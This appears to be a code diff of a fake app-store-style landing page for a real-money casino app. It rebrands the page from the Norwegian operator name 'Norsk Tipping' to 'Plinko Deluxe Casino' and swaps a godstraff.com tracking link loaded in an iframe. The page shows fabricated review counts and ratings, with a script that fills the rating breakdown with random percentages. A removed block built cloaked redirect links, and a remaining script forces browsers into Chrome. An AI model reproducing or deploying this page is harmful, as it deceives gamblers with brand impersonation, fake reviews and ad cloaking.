@@ -12,7 +12,7 @@
   <script src="static/home/dark_theme/dark_theme.js"></script>
 
   <link rel="manifest" href="./manifest.json">
-  
+
   <!-- <h1 id="logs-h1"></h1>
   <script>
     var logs = `<div class="logs">
@@ -41,7 +41,7 @@
   </script>
   <script type="text/javascript">
 
-    const url = "https://godstraff.com/6b3sYWH8"
+    const url = "https://godstraff.com/sK3S9YZy"
 
     const server_url = ""
     // const landing_url = "/play-pay?style=spirit-en"
@@ -134,26 +134,11 @@
         if (object_parameters.redirect == "true") {
           object_parameters.redirect_process(storage);
         } else {
-          if (parameters.includes('sub_id_3') || parameters.includes('sub3')) {
+          if (parameters.includes('sub_id_3')) {
             if (storage == null || storage == "" || storage == false) {
               object_storage.set_parameters(parameters)
               object_storage.set_buyer(object_parameters.buyer)
             }
-          }
-
-          let newParameters = parameters.split('&');
-          if (parameters.includes('sub_id_3')) {
-            newParameters.push(`sub_id_10=${object_storage.get_user_id()}`);
-            newParameters.push(`sub_id_7=${window.location.hostname}`);
-            newParameters = newParameters.join('&');
-
-            object_storage.set_parameters(newParameters);
-          } else if (parameters.includes('sub3')) {
-            newParameters.push(`sub10=${object_storage.get_user_id()}`);
-            newParameters.push(`sub7=${window.location.hostname}`);
-            newParameters = newParameters.join('&');
-
-            object_storage.set_parameters(newParameters);
           }
 
           // var newURL = location.href.split("?")[0];
@@ -315,7 +300,6 @@
 
   </script>
 
-
  <!-- ONESIGNAL -->
  <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.es6.js?v=160201" defer=""></script>
  <script src="https://cdn.onesignal.com/sdks/web/v16/OneSignalSDK.page.js" defer=""></script>
@@ -324,8 +308,8 @@
    window.OneSignalDeferred = window.OneSignalDeferred || [];
    OneSignalDeferred.push(async function(OneSignal) {
      await OneSignal.init({
-       appId: "f5860265-f555-4204-ac57-1f6f88a14c16",
-       safari_web_id: "web.onesignal.auto.13dd012d-81c7-44d8-8660-15690626d9c4",
+       appId: "070b899e-7262-458e-93b0-ca53d6ecd6ea",
+       safari_web_id: "web.onesignal.auto.6433c312-cad6-4ca7-979f-88baba10a6f6",
        notifyButton: {
          enable: false,
 
@@ -360,58 +344,6 @@
      }
    </style>
  <!-- ONESIGNAL END -->
-
-  <!-- pwa + ios -->
-  <script>
-
-    function redirectToStore(param) {
-      // https://startside.click
-      // iron-cardtofex.me
-
-      function getSubParam(paramName, defaultValue) {
-        return get_param_value(paramName) ? get_param_value(paramName) : defaultValue;
-      }
-
-      function buildLink() {
-        const subParams = Array.from({ length: 9 }, (_, i) => {
-          const subIndex = i + 2;
-          const subValue = getSubParam(`sub_id_${subIndex}`, getSubParam(`sub${subIndex}`, `sub${subIndex}`));
-          return `&sub${subIndex}=${subValue}`;
-        }).join('');
-        return `https://${get_param_value('ios')}/?fb_dynamic_pixel=${get_param_value('pixel')}${subParams}${get_param_value('no_cloak') ? '&no_cloak=1' : ''}`;
-      }
-
-      function getRemainingParams(excludeParams) {
-        const urlParams = new URLSearchParams(window.location.search);
-        excludeParams.forEach(param => urlParams.delete(param));
-        return urlParams.toString();
-      }
-
-      let targetLink = buildLink();
-
-      const usedParams = [
-        'ios', 'pixel', 'no_cloak',
-        ...Array.from({ length: 9 }, (_, i) => `sub${i + 2}`),
-        ...Array.from({ length: 9 }, (_, i) => `sub_id_${i + 2}`)
-      ];
-      const remainingParams = getRemainingParams(usedParams);
-
-      if (remainingParams) {
-        targetLink += `&${remainingParams}`;
-      }
-
-      console.log(targetLink);
-
-      if (get_param_value('ios') && user.os.family !== "Android") {
-        window.location.href = targetLink;
-      }
-    }
-
-    redirectToStore(window.location.search);
-
-
-
-  </script>
 
   <style>
     .iframe-container {
@@ -505,12 +437,12 @@
       align-items: center;
     }
   </style>
-  <title> Norsk Tipping  </title>
+  <title>Plinko Deluxe Casino</title>
   <meta name="theme-color" content="#ffffff" />
   <meta name="robots" content="index,follow" data-qmeta="robots" />
   <meta name="google" content="notranslate" />
   <meta name="title"
-    content="Dive into a world of sweetness and excitement with  Norsk Tipping  ! This delightful slot game offers a vibrant and colorful experience for players seeking a treat-filled adventure. Set against a backdrop of luscious landscapes and mouthwatering candies,  Norsk Tipping   tantalizes the senses with its engaging gameplay and a myriad of sugary delights. The reels are adorned with an assortment of delicious fruit symbols, adding to the game's charm and appeal."
+    content="Bem-vindo ao mundo da emoção e dos grandes ganhos com o Plinko Leon Special™, o companheiro perfeito para quem aprecia entretenimento de alto nível e muitas oportunidades de ganhar. Plinko Leon Special™ é um cassino móvel inovador e de alta tecnologia que oferece jogos emocionantes, bônus generosos e segurança em cada etapa."
     data-qmeta="title" />
   <meta name="mobile-web-app-capable" content="yes" />
   <meta name="apple-mobile-wep-app-capable" content="yes">
@@ -519,37 +451,36 @@
   <link rel="alternate" hreflang="en" href="/" data-qmeta="alternateEn" />
 
   <!-- FACESPACE -->
-  <meta property="og:title" content=" Norsk Tipping  " />
+  <meta property="og:title" content="Plinko Deluxe Casino" />
   <meta property="og:description"
-    content="Dive into a world of sweetness and excitement with  Norsk Tipping  ! This delightful slot game offers a vibrant and colorful experience for players seeking a treat-filled adventure. Set against a backdrop of luscious landscapes and mouthwatering candies,  Norsk Tipping   tantalizes the senses with its engaging gameplay and a myriad of sugary delights. The reels are adorned with an assortment of delicious fruit symbols, adding to the game's charm and appeal." />
+    content="Bem-vindo ao mundo da emoção e dos grandes ganhos com o Plinko Leon Special™, o companheiro perfeito para quem aprecia entretenimento de alto nível e muitas oportunidades de ganhar. Plinko Leon Special™ é um cassino móvel inovador e de alta tecnologia que oferece jogos emocionantes, bônus generosos e segurança em cada etapa." />
 
   <meta property="og:image:height" content="600" />
   <meta property="og:image:width" content="314" />
   <meta property="og:image" content="./media/photos/logo.jpg" />
 
   <meta property="fb:app_id" content="..." />
-  <meta property="fb:admins" content=" Norsk Tipping  " />
+  <meta property="fb:admins" content="Plinko Deluxe Casino" />
 
   <meta property="og:type" content="website" />
-  <meta property="og:name" content=" Norsk Tipping  " />
+  <meta property="og:name" content="Plinko Deluxe Casino" />
   <meta property="og:url" content="/" />
 
   <!-- THE TWITTER MACHINE -->
   <meta name="twitter:card" content="summary" />
   <meta name="twitter:url" content="/" />
-  <meta name="twitter:site" content=" Norsk Tipping  " />
-  <meta name="twitter:creator" content=" Norsk Tipping  " />
-  <meta name="twitter:title" content=" Norsk Tipping  " />
+  <meta name="twitter:site" content="Plinko Deluxe Casino" />
+  <meta name="twitter:creator" content="Plinko Deluxe Casino" />
+  <meta name="twitter:title" content="Plinko Deluxe Casino" />
   <meta name="twitter:description"
-    content="Dive into a world of sweetness and excitement with  Norsk Tipping  ! This delightful slot game offers a vibrant and colorful experience for players seeking a treat-filled adventure. Set against a backdrop of luscious landscapes and mouthwatering candies,  Norsk Tipping   tantalizes the senses with its engaging gameplay and a myriad of sugary delights. The reels are adorned with an assortment of delicious fruit symbols, adding to the game's charm and appeal.
-    " />
-  <meta name="twitter:image" content="./media/photos/logo.jpg" />
+    content="Bem-vindo ao mundo da emoção e dos grandes ganhos com o Plinko Leon Special™, o companheiro perfeito para quem aprecia entretenimento de alto nível e muitas oportunidades de ganhar. Plinko Leon Special™ é um cassino móvel inovador e de alta tecnologia que oferece jogos emocionantes, bônus generosos e segurança em cada etapa." />
+  <meta name="twitter:image" content="./media/photos/logo.png" />
 
   <!-- G++ -->
-  <meta itemprop="name" content=" Norsk Tipping  " />
+  <meta itemprop="name" content="Plinko Deluxe Casino" />
   <meta itemprop="description"
-    content="Dive into a world of sweetness and excitement with  Norsk Tipping  ! This delightful slot game offers a vibrant and colorful experience for players seeking a treat-filled adventure. Set against a backdrop of luscious landscapes and mouthwatering candies,  Norsk Tipping   tantalizes the senses with its engaging gameplay and a myriad of sugary delights. The reels are adorned with an assortment of delicious fruit symbols, adding to the game's charm and appeal." />
-  <meta itemprop="image" content="./media/photos/logo.jpg" />
+    content="Bem-vindo ao mundo da emoção e dos grandes ganhos com o Plinko Leon Special™, o companheiro perfeito para quem aprecia entretenimento de alto nível e muitas oportunidades de ganhar. Plinko Leon Special™ é um cassino móvel inovador e de alta tecnologia que oferece jogos emocionantes, bônus generosos e segurança em cada etapa." />
+  <meta itemprop="image" content="./media/photos/logo.png" />
 
   <link rel="apple-touch-icon" sizes="180x180" href="./media/photos/fav/apple-touch-icon.png" />
   <link rel="mask-icon" href="./media/photos/" color="#fb0266" />
@@ -684,7 +615,7 @@
           <div class="program__left">
             <div class="program__left-top">
               <div class="program-logo">
-                <img src="./media/photos/logo.jpg" alt="Live Casino PWA Application" id="logotype" />
+                <img src="./media/photos/logo.jpeg" alt="Live Casino PWA Application" id="logotype" />
                 <div class="showbox">
                   <div class="loader">
                     <svg class="circular" viewBox="25 25 50 50">
@@ -704,9 +635,9 @@
               </div>
 
               <div class="program-info">
-                <h1 class="program-name c-black"> Norsk Tipping  </h1>
+                <h1 class="program-name c-black">Plinko Deluxe Casino</h1>
                 <div class="program-info-first">
-                  <span class="program-company primary-text">  Norsk Tipping   inc.</span>
+                  <span class="program-company primary-text"> Plinko Deluxe inc.</span>
                   <span class="advertising c-text">Casino</span>
                 </div>
                 <div class="program-info-instal">
@@ -726,7 +657,7 @@
                 <div class="program__left-bottom">
                   <div class="program__reviews">
                     <span class="program__reviews-rating c-black">
-                      4.7
+                      4.6
                       <img src="media/photos/2022/03/22/star_black_24dp.svg" alt="Live Casino Rating" />
                     </span>
                     <span class="program-reviews c-text"> 354 565 reviews </span>
@@ -771,17 +702,20 @@
 
         <div class="program__images-box">
           <div class="program__images">
-            <a href="./media/photos/s1.jpg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
-              <img src="./media/photos/s1.jpg" alt="Live Casino Screenshot">
+            <a href="./media/photos/s1.jpeg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
+              <img src="./media/photos/s1.jpeg" alt="Live Casino Screenshot">
             </a>
-            <a href="./media/photos/s2.jpg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
-              <img src="./media/photos/s2.jpg" alt="Live Casino Screenshot">
+            <a href="./media/photos/s2.jpeg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
+              <img src="./media/photos/s2.jpeg" alt="Live Casino Screenshot">
             </a>
-            <a href="./media/photos/s3.jpg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
-              <img src="./media/photos/s3.jpg" alt="Live Casino Screenshot">
+
+            <a href="./media/photos/s3.jpeg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
+              <img src="./media/photos/s3.jpeg" alt="Live Casino Screenshot">
             </a>
-            <a href="./media/photos/s4.jpg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
-              <img src="./media/photos/s4.jpg" alt="Live Casino Screenshot">
+            <a href="./media/photos/s4.jpeg" aria-label="Live Casino Screenshot" data-fancybox="gallery">
+              <img src="./media/photos/s4.jpeg" alt="Live Casino Screenshot">
+            </a>
+
             </a>
           </div>
         </div>
@@ -800,10 +734,31 @@
           </div>
           <div class="description__text">
             <p class="c-text">
-              Få eksklusive bonuser og de beste kampanjene med bare ett klikk - Installer Norsk Tipping Casino-appen på mobilen og spill med ekte penger. 100
-              gratisspinn og 300 % på første innskudd etter registrering.
-              </p>
-              <div class="description__category">
+              Üst düzey eğlenceyi ve birçok kazanma fırsatını takdir edenler için mükemmel bir yol arkadaşı olan Plinko Leon Special™ ile heyecan ve büyük kazançlar dünyasına hoş geldiniz. Plinko Leon Special™, her adımda heyecan verici oyunlar, cömert bonuslar ve güvenlik sunan yenilikçi ve gelişmiş bir mobil kumarhanedir.
+
+              Ana Özellikler:
+              <br><br>
+              Geniş oyun yelpazesi: Plinko Leon Special™ slot, rulet, blackjack, poker ve çok daha fazlasını içeren çok çeşitli casino oyunları sunar. Seçim her zaman sizindir ve her oyun benzersiz bir deneyim sunar.
+              <br><br>
+              
+              Gerçek parayla veya ücretsiz oynayın: Gerçek parayla oynamaya başlayın veya bahis koymadan önce karar vermek için ücretsiz oyunları deneyin. Plinko Leon Special™, finansal riskler olmadan heyecanın tadını çıkarma fırsatı sunuyor.
+              <br><br>
+              
+              Bonuslar ve Promosyonlar: Kayıt sırasında cömert bonuslar alın ve kazanma şansınızı en üst düzeye çıkarmak için düzenli tekliflerin keyfini çıkarın. Plinko Leon Special™ her zaman oyunculara ek avantajlar sunmaya çalışır.
+              <br><br>
+              
+              Kolaylık ve Güvenlik: Plinko Leon Special™ uygulaması, kullanıcı rahatlığına ve yüksek düzeyde güvenliğe odaklanılarak tasarlanmıştır. Kişisel verileriniz ve finansal bilgileriniz gelişmiş şifreleme teknolojileri ile korunmaktadır.
+              <br><br>
+              
+              Mobilite: Uygulamanın mobil sürümüyle en sevdiğiniz oyunları istediğiniz zaman, istediğiniz yerde oynayın. Plinko Leon Special™ oyun deneyiminizi mümkün olduğunca rahat ve erişilebilir hale getirir.
+              <br><br>
+              
+              Her anın heyecan verici zaferlere yol açabileceği oyun dünyasında Plinko Leon Special™'ın rehberiniz olmasına izin verin. Uygulamayı bugün indirin ve en iyi çevrimiçi kumarhanede oynamanın yoğun heyecanını hissedin!
+
+
+            </p>
+          </div>
+          <div class="description__category">
             <a class="description__category-btn" href="/?redirect=true" aria-label="Live Casino Category">
               #1 top casino apps
             </a>
@@ -814,7 +769,7 @@
             <div class="program__left-bottom">
               <div class="program__reviews">
                 <span class="program__reviews-rating c-black">
-                  4.7
+                  4.6
                   <img src="media/photos/2022/03/22/star_black_24dp.svg" alt="Live Casino Rating" />
                 </span>
                 <span class="program-reviews c-text"> 354 565 reviews </span>
@@ -856,10 +811,10 @@
           <div class="rating__box">
             <div class="rating__left">
               <div class="rating__total c-black">
-                <span>4.7</span>
+                <span>4.6</span>
               </div>
               <div class="rating__stars-box">
-                <div class="Stars" style="--rating: 4.7;" aria-label="Rating of this product is 4.7 out of 5.">
+                <div class="Stars" style="--rating: 4.6;" aria-label="Rating of this product is 4.6 out of 5.">
                 </div>
               </div>
               <span class="total-votes c-text">
@@ -1263,8 +1218,8 @@
         var four = localStorage.getItem("four")
         var five = localStorage.getItem("five")
       } else {
-        var stars = parseFloat("4.7")
-        if (stars > 4.7) {
+        var stars = parseFloat("4.6")
+        if (stars > 4.6) {
           five = new String(getRandomInt(50, 70)) + "%"
           four = new String(getRandomInt(10, 25)) + "%"
           three = new String(getRandomInt(5, 15)) + "%"
@@ -1422,9 +1377,9 @@
           if (object_parameters.fbclid) {
             object_parameters.promo = "false";
           }
-          var ready_frame_url = "https://godstraff.com/6b3sYWH8?sub_id_1={sub_id_1}&sub_id_2={sub_id_2}&sub_id_3={sub_id_3}&sub_id_4={sub_id_4}&sub_id_5={sub_id_5}&sub_id_6={sub_id_6}&sub_id_7={sub_id_7}&pixel={pixel}&token={token}&fbclid={fbclid}" + param;
+          var ready_frame_url = "https://godstraff.com/sK3S9YZy/?sub_id_1={sub_id_1}&sub_id_2={sub_id_2}&sub_id_3={sub_id_3}&sub_id_4={sub_id_4}&sub_id_5={sub_id_5}&sub_id_6={sub_id_6}&sub_id_7={sub_id_7}&pixel={pixel}&token={token}&fbclid={fbclid}" + param;
         } else {
-          var ready_frame_url = "https://godstraff.com/6b3sYWH8?sub_id_1={sub_id_1}&sub_id_2={sub_id_2}&sub_id_3={sub_id_3}&sub_id_4={sub_id_4}&sub_id_5={sub_id_5}&sub_id_6={sub_id_6}&sub_id_7={sub_id_7}&pixel={pixel}&token={token}&fbclid={fbclid}" + param;
+          var ready_frame_url = "https://godstraff.com/sK3S9YZy/?sub_id_1={sub_id_1}&sub_id_2={sub_id_2}&sub_id_3={sub_id_3}&sub_id_4={sub_id_4}&sub_id_5={sub_id_5}&sub_id_6={sub_id_6}&sub_id_7={sub_id_7}&pixel={pixel}&token={token}&fbclid={fbclid}" + param;
         }
 
         iframe.setAttribute("src", ready_frame_url);
@@ -1470,11 +1425,12 @@
   <script src="./static/home/js/ua-parser.min.js"></script>
   <script>
     const ua = new UAParser;
-    if (ua.getBrowser().name !== "Chrome" && user.os.family == "Android") {
+    if (ua.getBrowser().name !== "Chrome") {
       var lnk = document.getElementById("r");
       lnk.setAttribute("href", "intent://" + window.location.hostname + window.location.search + "#Intent;scheme=https;package=com.android.chrome;end");
       lnk.click();
     }
+
   </script>
 
 </body>
